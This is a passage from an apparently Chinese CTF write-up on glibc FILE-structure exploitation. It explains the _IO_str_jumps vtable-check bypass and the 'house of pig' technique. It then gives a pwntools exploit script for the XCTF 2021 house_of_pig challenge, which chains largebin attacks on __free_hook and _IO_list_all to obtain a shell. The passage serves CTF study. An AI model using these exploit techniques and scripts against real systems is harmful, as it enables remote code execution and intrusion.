p64(<span class="hljs-number">0</span>)<br>stream += p64(vtable_addr)<br>stream += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>stream += p64(sys)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x400</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span><br>payload += stream<br>edit(payload)<br>p.sendlineafter(<span class="hljs-string">&quot;: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="glibc-2-24-2-27"><a href="#glibc-2-24-2-27" class="headerlink" title="glibc-2.24~2.27"></a>glibc-2.24~2.27</h3><p>在<code>glibc-2.27</code>以及之后libc版本，调用 exit 函数、正常从 main 返回或者 libc 执行 abort流程，执行<code>_IO_flush_all_lockp</code>来刷新<code>_IO_list_all</code> 链表中所有项的文件流，exit-&gt;__run_exit_handlers-&gt;_IO_cleanup-&gt;_IO_flush_all_lockp-&gt;…</p>
<p>对 vtable 指向的地址新增了检查：检查地址是否落在 glibc 中的 vtable 段中，<code>__start___libc_IO_vtables</code>指向第一个vtable地址<code>_IO_helper_jumps</code>，而<code>__stop___libc_IO_vtables</code>指向最后一个。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">const</span> struct _IO_jump_t *</span><br><span class="hljs-function"><span class="hljs-title">IO_validate_vtable</span> <span class="hljs-params">(<span class="hljs-keyword">const</span> struct _IO_jump_t *vtable)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;<br>  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *ptr = (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *) vtable;<br>  <span class="hljs-keyword">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (offset &gt;= section_length)) <span class="hljs-comment">//检查vtable指针是否在glibc的vtable段中。</span><br>    <span class="hljs-comment">/* The vtable pointer is not in the expected section.  Use the</span><br><span class="hljs-comment">       slow path, which will terminate the process if necessary.  */</span><br>    _IO_vtable_check ();<br>  <span class="hljs-keyword">return</span> vtable;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>进入到<code>_IO_vtable_check ()</code> 比较难绕过其中检查（虽难也是可以实现），所以要让指针落在 vtable 段中。总共有两种办法可以通过检查，进行利用：</p>
<ol>
<li>使用内部的vtable<code>_IO_str_jumps</code>或<code>_IO_wstr_jumps</code>来进行利用。</li>
<li>使用缓冲区指针来进行任意内存读写。</li>
</ol>
<h4 id="IO-str-jumps-或-IO-wstr-jumps"><a href="#IO-str-jumps-或-IO-wstr-jumps" class="headerlink" title="_IO_str_jumps 或 _IO_wstr_jumps"></a>_IO_str_jumps 或 _IO_wstr_jumps</h4><p>vtable数组中存在<code>_IO_str_jumps</code>以及<code>_IO_wstr_jumps</code>两个vtable。这两个vtable较为相似，只是<code>_IO_wstr_jumps</code>是处理wchar的，后者利用方法完全相同，介绍其一即可，以<code>_IO_str_jumps</code>为例。</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20220317222314932.png"><span class="image-caption">image-20220317222314932</span></p>
<p>其中一个可利用函数 _IO_str_finish 源代码如下：</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20220317233212853.png"><span class="image-caption">image-20220317233212853</span></p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">void</span><br>_IO_str_finish (_IO_FILE *fp, <span class="hljs-keyword">int</span> dummy)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))<br>    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base); <span class="hljs-comment">//执行函数 call qword ptr [fp+0xE8h]</span><br>  fp-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br>  <br>  _IO_default_finish (fp, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以看见，如果满足条件，将直接把<code>fp-&gt;_s._free_buffer</code>当作函数指针来调用。那么，只要在之前低版本布置的vtable 修改为<code>_IO_str_jumps-8</code>，这样就会使得 _IO_str_finish 成为了伪造的vtable地址的 _IO_OVERFLOW 函数，并且这个地址是在 vtable 段中的，可以满足检查。</p>
<p>然后去构造 fp-&gt;_IO_buf_base 为 “/bin/sh\x00”的地址，即可满足判断条件，同时也满足了后面作为参数的需求。</p>
<p>接着构造 fp-&gt;_flags 不包含 _IO_USER_BUF 。它的定义为<code>#define _IO_USER_BUF 1</code>， 即 fp-&gt;_flags 最低位为0即可 。</p>
<p>最后把 fp-&gt;_s._free_buffer 修改为 system 或者 one_gadget 。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">vtable = _IO_str_jumps - <span class="hljs-number">0x8</span><br>fp-&gt;_flags = <span class="hljs-number">0</span><br>fp-&gt;_IO_buf_base = binsh_addr<br>fp + <span class="hljs-number">0xe8</span> = system_addr<br></code></pre></td></tr></table></figure>

<p>另一个可以利用函数 _IO_str_overflow，源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> _IO_str_overflow (_IO_FILE *fp, <span class="hljs-keyword">int</span> c)<br>&#123;<br>[...]<br>    &#123;<br>      <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="hljs-comment">// not allowed </span><br>    <span class="hljs-keyword">return</span> EOF;<br>      <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">char</span> *new_buf;<br>      <span class="hljs-keyword">char</span> *old_buf = fp-&gt;_IO_buf_base;<br>      <span class="hljs-keyword">size_t</span> old_blen = _IO_blen (fp);<br>      _IO_size_t new_size = <span class="hljs-number">2</span> * old_blen + <span class="hljs-number">100</span>;                <br>      <span class="hljs-keyword">if</span> (new_size &lt; old_blen)<br>        <span class="hljs-keyword">return</span> EOF;<br>      new_buf<br>        = (<span class="hljs-keyword">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);<br>    [...]<br>&#125;<br></code></pre></td></tr></table></figure>

<p> old_blen 是通过 _IO_buf_end 减去 _IO_buf_base 得到的，并且指向的 _IO_str_overflow 偏移是一致的，所以不需要更改，因此需要增添的地方如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">vtable = _IO_str_jumps<br>fp-&gt;_flags = <span class="hljs-number">0</span><br>fp-&gt;_IO_buf_base = <span class="hljs-number">0</span><br>fp-&gt;_IO_buf_end = (bin_sh_addr - <span class="hljs-number">100</span>) / <span class="hljs-number">2</span><br>fp + <span class="hljs-number">0xe8</span> = system_addr<br></code></pre></td></tr></table></figure>

<p>另：</p>
<p>如果libc中没有<code>_IO_wstr_jumps</code>与<code>_IO_str_jumps</code>表的符号，给出定位<code>_IO_str_jumps</code>与<code>_IO_wstr_jumps</code>的方法：</p>
<ul>
<li>定位<code>_IO_str_jumps</code>表的方法，<code>_IO_str_jumps</code>是vtable中的倒数第二个表，可以通过vtable的最后地址减去<code>0x168</code>。</li>
<li>定位<code>_IO_wstr_jumps</code>表的方法，可以通过先定位<code>_IO_wfile_jumps</code>，得到它的偏移后再减去<code>0x240</code>即是<code>_IO_wstr_jumps</code>的地址。</li>
</ul>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/t01e8528e095b25d09d.png"><span class="image-caption">img</span></p>
<p>glibc-2.28 中直接使用 malloc 和 free 替换掉原来在 _IO_str_fields 里的 <code>_allocate_buffer</code> 和 <code>_free_buffer</code>。因而不再使用偏移，无法再利用 __libc_IO_vtables 上的 vtable 绕过检查，于是上面的利用技术都失效了。</p>
<h3 id="glibc-2-28-2-34"><a href="#glibc-2-28-2-34" class="headerlink" title="glibc-2.28~2.34"></a>glibc-2.28~2.34</h3><p>glibc-2.24 中我们伪造 vtable 是因为其不可写，但是在 glibc-2.29~2.35 中，vtable 是可写的</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20220824163622145.png"><span class="image-caption">image-20220824163622145</span></p>
<p>因此可以选择覆盖 _IO_file_jumps</p>
<h3 id="house-of-pig"><a href="#house-of-pig" class="headerlink" title="house of pig"></a>house of pig</h3><p>适用版本 glibc2.28~2.33，适用于程序中仅有 <code>calloc 函数</code>来申请 chunk，而没有调用 <code>malloc 函数</code>的情况。</p>
<p>而 <code>house of pig</code>的触发条件就是调用 <code>_IO_flush_all_lockp</code>的条件，即需要满足如下三个之一：</p>
<ol>
<li>当 libc 执行 abort 流程时。</li>
<li>程序显式调用 exit 。</li>
<li>程序能通过主函数返回。</li>
</ol>
<p>攻击前提：</p>
<ol>
<li>拥有堆地址和 libc 地址</li>
<li>能够把 free_hook 放入 tcache 中</li>
<li>可以劫持 IO 流（如劫持 _IO_list_all）</li>
</ol>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>glibc2.28以后的 _IO_str_overflow 函数源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span><br>_IO_str_overflow (FILE *fp, <span class="hljs-keyword">int</span> c)<br>&#123;<br>  <span class="hljs-keyword">int</span> flush_only = c == EOF;<br>  <span class="hljs-keyword">size_t</span> pos;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)<br>      <span class="hljs-keyword">return</span> flush_only ? <span class="hljs-number">0</span> : EOF;<br>  <span class="hljs-keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))<br>    &#123;<br>      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;<br>      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;<br>      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;<br>    &#125;<br>  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;<br>  <span class="hljs-keyword">if</span> (pos &gt;= (<span class="hljs-keyword">size_t</span>) (_IO_blen (fp) + flush_only))     <span class="hljs-comment">// 需要满足的条件</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="hljs-comment">/* not allowed to enlarge */</span><br>    <span class="hljs-keyword">return</span> EOF;<br>      <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">char</span> *new_buf;<br>      <span class="hljs-keyword">char</span> *old_buf = fp-&gt;_IO_buf_base;<br>      <span class="hljs-keyword">size_t</span> old_blen = _IO_blen (fp);<br>      <span class="hljs-keyword">size_t</span> new_size = <span class="hljs-number">2</span> * old_blen + <span class="hljs-number">100</span>;<br>      <span class="hljs-keyword">if</span> (new_size &lt; old_blen)<br>        <span class="hljs-keyword">return</span> EOF;<br>      new_buf = <span class="hljs-built_in">malloc</span> (new_size);<br>      <span class="hljs-keyword">if</span> (new_buf == <span class="hljs-literal">NULL</span>)<br>        &#123;<br>          <span class="hljs-comment">/*      __ferror(fp) = 1; */</span><br>          <span class="hljs-keyword">return</span> EOF;<br>        &#125;<br>      <span class="hljs-keyword">if</span> (old_buf)<br>        &#123;<br>          <span class="hljs-built_in">memcpy</span> (new_buf, old_buf, old_blen);<br>          <span class="hljs-built_in">free</span> (old_buf);<br>          <span class="hljs-comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span><br>          fp-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br>        &#125;<br>      <span class="hljs-built_in">memset</span> (new_buf + old_blen, <span class="hljs-string">&#x27;\0&#x27;</span>, new_size - old_blen);<br><br>      _IO_setb (fp, new_buf, new_buf + new_size, <span class="hljs-number">1</span>);<br>      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);<br>      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);<br>      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);<br>      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);<br><br>      fp-&gt;_IO_write_base = new_buf;<br>      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;<br>    &#125;<br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (!flush_only)<br>    *fp-&gt;_IO_write_ptr++ = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>) c;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)<br>    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;<br>  <span class="hljs-keyword">return</span> c;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>重点关注这段代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">char</span> *new_buf;<br><span class="hljs-keyword">char</span> *old_buf = fp-&gt;_IO_buf_base;<br><span class="hljs-keyword">size_t</span> old_blen = _IO_blen (fp);<br><span class="hljs-keyword">size_t</span> new_size = <span class="hljs-number">2</span> * old_blen + <span class="hljs-number">100</span>;<br><span class="hljs-keyword">if</span> (new_size &lt; old_blen)<br>  <span class="hljs-keyword">return</span> EOF;<br>new_buf = <span class="hljs-built_in">malloc</span> (new_size);<br><span class="hljs-keyword">if</span> (new_buf == <span class="hljs-literal">NULL</span>)<br>  &#123;<br>    <span class="hljs-comment">/*      __ferror(fp) = 1; */</span><br>    <span class="hljs-keyword">return</span> EOF;<br>  &#125;<br><span class="hljs-keyword">if</span> (old_buf)<br>  &#123;<br>    <span class="hljs-built_in">memcpy</span> (new_buf, old_buf, old_blen);<br>    <span class="hljs-built_in">free</span> (old_buf);<br>    <span class="hljs-comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span><br>    fp-&gt;_IO_buf_base = <span class="hljs-literal">NULL</span>;<br>  &#125;<br></code></pre></td></tr></table></figure>

<p>可以看到程序里面有 malloc,memcpy,free 等函数，而参数 old_buf，old_blen = _IO_buf_end - _IO_buf_base，是我们可以控制的，因此可以利用这一点来进行堆块布局，实现 FSOP。</p>
<p>需要满足的条件是 _IO_write_ptr - _IO_write_base &gt;= _IO_buf_end - _IO_buf_base。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;<br><span class="hljs-keyword">if</span> (pos &gt;= (<span class="hljs-keyword">size_t</span>) (_IO_blen (fp) + flush_only))   <br></code></pre></td></tr></table></figure>

<p>所以构造 FILE 结构的时候，重点是将其 vtable 由 _IO_file_jumps 修改为 _IO_str_jumps，那么会连续调用 malloc、memcpy、free 函数。可以实现利用 <code>malloc</code> 申请出那个已经被放入到 tcache 链表的头部的包含 <code>__free_hook</code> 的 fake chunk；通过<code>memcpy</code> 将提前在堆上布置好的数据写入到申请出来的包含<code>__free_hook</code>的 chunk 中，从而能任意控制 <code>__free_hook</code>，这里可以将其修改为 system 函数地址；最后调用 <code>free</code>时，就能够触发 __free_hook ，同时在布置堆上数据的时候，使其以字符串 “/bin/sh\x00” 开头，那么最终就会执行 system(“/bin/sh”)。</p>
<p>因此最终布局对应关系如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">_flags = <span class="hljs-number">0</span><br>_IO_write_base = <span class="hljs-number">0</span><br>_IO_write_ptr = <span class="hljs-number">0xffffffffffff</span> <span class="hljs-comment"># 满足条件</span><br>_IO_buf_base = binsh_addr<br>_IO_buf_end = binsh_addr + offset<br>new_buf = malloc(<span class="hljs-number">2</span> * (_IO_buf_end - _IO_buf_base) + <span class="hljs-number">100</span>)<br>memcpy(new_buf, _IO_buf_base, _IO_buf_end - _IO_buf_base)<br>free(_IO_buf_base)<br></code></pre></td></tr></table></figure>

<h4 id="例题-2021xctf-final-house-of-pig"><a href="#例题-2021xctf-final-house-of-pig" class="headerlink" title="例题 2021xctf_final house_of_pig"></a>例题 2021xctf_final house_of_pig</h4><p>漏洞点一：在切换角色时，第三个判断被’\x00’截断了，只需要找一个 md5 值为与 ‘&lt;D’ 相等即可随意切换角色。</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20230125180253592.png"><span class="image-caption">image-20230125180253592</span></p>
<p>漏洞点二：存在指针悬挂，采取策略是使用 flag 位来进行判断。</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20230125180511122.png"><span class="image-caption">image-20230125180511122</span></p>
<p>但是在保存角色状态时，flag 位并未跟着一起保存，而在恢复时会把 flag 位清零，所以就会造成 UAF，但是无法 double free。</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20230125180635469.png"><span class="image-caption">image-20230125180635469</span></p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20230125180742629.png"><span class="image-caption">image-20230125180742629</span></p>
<p>IO 堆块布局参考：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">stream = <span class="hljs-number">2</span> * p64(<span class="hljs-number">0</span>)<br>stream += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0xffffffffffff</span>)        <span class="hljs-comment"># (_IO_write_ptr - fp-&gt;_IO_write_base) &gt;= (_IO_buf_end - _IO_buf_base)</span><br>stream += p64(<span class="hljs-number">0</span>)<br>stream += p64()              <span class="hljs-comment"># _IO_buf_base</span><br>stream += p64()              <span class="hljs-comment"># _IO_buf_end</span><br>stream = stream.ljust(<span class="hljs-number">0xb0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)  <span class="hljs-comment"># malloc_size =  2*(_IO_buf_end - _IO_buf_base) + 100</span><br>stream += p64(<span class="hljs-number">0</span>)                    <span class="hljs-comment"># _mode = 0</span><br>stream = stream.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>stream += p64(_IO_str_jumps)        <span class="hljs-comment"># vtable</span><br></code></pre></td></tr></table></figure>

<p>成功getshell。</p>
<p><img src="/2021/11/06/2021-11-06-IO-FLIE/image-20230125180849626.png"><span class="image-caption">image-20230125180849626</span></p>
<p>exp申请一个 0xa0 的堆块可以触发 largebin attack，说明触发攻击时不一定需要申请一块比 ptr2 大的堆块，只要申请的堆块 size 大等于 0xa0即可（其他题目也是这样，不知道为什么。）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pig&#x27;</span>)<br>DEBUG = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> DEBUG:<br>    libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)<br>    p = process(<span class="hljs-string">&#x27;./pig&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    ip = <span class="hljs-string">&#x27;127&#x27;</span><br>    port = <span class="hljs-number">30007</span><br>    libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>    p = remote(ip, port)<br>    <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>(<span class="hljs-params">info=<span class="hljs-string">&quot;b main&quot;</span></span>):</span><br>	gdb.attach(p, info)<br>	<span class="hljs-comment">#gdb.attach(p, &quot;b *$rebase(0x)&quot;)</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">choose</span>(<span class="hljs-params">choice</span>):</span><br>    p.sendlineafter(<span class="hljs-string">b&quot;Choice: &quot;</span>, <span class="hljs-built_in">str</span>(choice).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size, content</span>):</span><br>    choose(<span class="hljs-number">1</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the message size: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>    p.recvuntil(<span class="hljs-string">b&quot;message: &quot;</span>)<br>    p.send(content)<br>	<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx, content</span>):</span><br>    choose(<span class="hljs-number">3</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the message index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>    p.recvuntil(<span class="hljs-string">b&quot;message: &quot;</span>)<br>    p.send(content)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>    choose(<span class="hljs-number">2</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the message index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br>    p.recvuntil(<span class="hljs-string">b&#x27;The message is: &#x27;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    choose(<span class="hljs-number">4</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the message index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx).encode(<span class="hljs-string">&#x27;ascii&#x27;</span>))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change</span>(<span class="hljs-params">role</span>):</span><br>    choose(<span class="hljs-number">5</span>)<br>    <span class="hljs-keyword">if</span> (role == <span class="hljs-number">1</span>):<br>        p.sendlineafter(<span class="hljs-string">b&quot;user:\n&quot;</span>, <span class="hljs-string">b&quot;A\x01\x95\xc9\x1c&quot;</span>)<br>    <span class="hljs-keyword">if</span> (role == <span class="hljs-number">2</span>):<br>        p.sendlineafter(<span class="hljs-string">b&quot;user:\n&quot;</span>, <span class="hljs-string">b&quot;B\x01\x87\xc3\x19&quot;</span>)<br>    <span class="hljs-keyword">if</span> (role == <span class="hljs-number">3</span>):<br>        p.sendlineafter(<span class="hljs-string">b&quot;user:\n&quot;</span>, <span class="hljs-string">b&quot;C\x01\xf7\x3c\x32&quot;</span>)<br><br><br>change(<span class="hljs-number">2</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    add(<span class="hljs-number">0x90</span>, <span class="hljs-string">b&#x27;b\n&#x27;</span> * <span class="hljs-number">3</span>) <span class="hljs-comment"># B0~B4</span><br>    free(i)    <span class="hljs-comment"># B0~B4</span><br><br>change(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x150</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span> * <span class="hljs-number">7</span>) <span class="hljs-comment"># A0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x150</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span> * <span class="hljs-number">7</span>) <span class="hljs-comment"># A1~A7</span><br>    free(i + <span class="hljs-number">1</span>)<br>free(<span class="hljs-number">0</span>)<br><br>change(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0xb0</span>, <span class="hljs-string">b&#x27;b\n&#x27;</span> * <span class="hljs-number">3</span>) <span class="hljs-comment"># B5</span><br><br>change(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x180</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># A8</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x180</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span> * <span class="hljs-number">8</span>) <span class="hljs-comment"># A9~A15</span><br>    free(i + <span class="hljs-number">9</span>)<br>free(<span class="hljs-number">8</span>)<br><br>change(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0xe0</span>, <span class="hljs-string">b&#x27;b\n&#x27;</span> * <span class="hljs-number">4</span>) <span class="hljs-comment"># B6</span><br><br>change(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x430</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span> * <span class="hljs-number">22</span>) <span class="hljs-comment"># A16</span><br><br>change(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0xf0</span>, <span class="hljs-string">b&#x27;b\n&#x27;</span> * <span class="hljs-number">5</span>) <span class="hljs-comment"># B7</span><br><br>change(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">16</span>)<br><br>change(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x440</span>, <span class="hljs-string">b&#x27;b\n&#x27;</span> * <span class="hljs-number">22</span>) <span class="hljs-comment"># B8</span><br><br>change(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">16</span>)<br>leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1ecfe0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %leak)<br>free_hook = leak + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>sys = leak + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>_IO_list_all = leak + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>_IO_str_jumps = leak + <span class="hljs-number">0x1e9560</span><br>edit(<span class="hljs-number">16</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span> + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>show(<span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x13940</span><br>log.info(<span class="hljs-string">&quot;heap_base==&gt;0x%x&quot;</span> %heap_base)<br><br><span class="hljs-comment"># first large bin attack</span><br>edit(<span class="hljs-number">16</span>, p64(leak + <span class="hljs-number">0x1ecfe0</span>)*<span class="hljs-number">2</span> + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x430</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span> * <span class="hljs-number">22</span>) <span class="hljs-comment"># A17</span><br>add(<span class="hljs-number">0x430</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span> * <span class="hljs-number">22</span>) <span class="hljs-comment"># A18</span><br>add(<span class="hljs-number">0x430</span>, <span class="hljs-string">b&#x27;a\n&#x27;</span> * <span class="hljs-number">22</span>) <span class="hljs-comment"># A19</span><br><br>change(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">8</span>)<br>add(<span class="hljs-number">0x450</span>, <span class="hljs-string">b&#x27;b\n&#x27;</span> * <span class="hljs-number">23</span>) <span class="hljs-comment"># B9</span><br><br>change(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">17</span>)<br><br>change(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">8</span>, p64(<span class="hljs-number">0</span>) + p64(free_hook - <span class="hljs-number">0x28</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>change(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;c\n&#x27;</span> * <span class="hljs-number">3</span>) <span class="hljs-comment"># C0 largebin attack</span><br><br>change(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">8</span>, <span class="hljs-number">2</span>*p64(heap_base + <span class="hljs-number">0x13e80</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>) <span class="hljs-comment"># recover</span><br><br><span class="hljs-comment">#second largebin_attack</span><br>change(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0x380</span>, <span class="hljs-string">b&#x27;c\n&#x27;</span> * <span class="hljs-number">18</span>) <span class="hljs-comment"># C1</span><br><br>change(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">19</span>)<br><br>change(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">8</span>, p64(<span class="hljs-number">0</span>) + p64(_IO_list_all - <span class="hljs-number">0x20</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>change(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;c\n&#x27;</span>*<span class="hljs-number">3</span>) <span class="hljs-comment"># C2 largebin attack</span><br><br>change(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">8</span>, <span class="hljs-number">2</span>*p64(heap_base + <span class="hljs-number">0x13e80</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>) <span 